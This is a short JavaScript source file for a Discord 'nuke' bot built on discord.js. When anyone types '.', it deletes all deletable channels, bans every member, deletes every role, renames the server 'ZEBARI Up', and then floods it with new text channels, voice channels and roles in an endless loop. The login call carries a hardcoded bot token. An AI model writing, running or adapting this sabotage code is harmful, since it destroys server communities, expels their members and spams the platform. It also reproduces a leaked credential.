const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = ".";
client.on("message", message => {
  if (message.content === ".") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban();
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName("ZEBARI Up");////nawek dane bo sar server 
      setInterval(function() {
        message.guild.createChannel("Zebari Up", "text");///////bo channel 
        message.guild.createChannel("Mard", "voice");////bo voice
        message.guild.createRole({ name: "Mard Up" });////nawek dane bo role kan
      });
    }
  }
});

client.login("ODc4NzQxMDY3Njk5MTkxODQ4.YSFlZA.dvQebh3tpSmLEMwASZKIyK9HMuo")
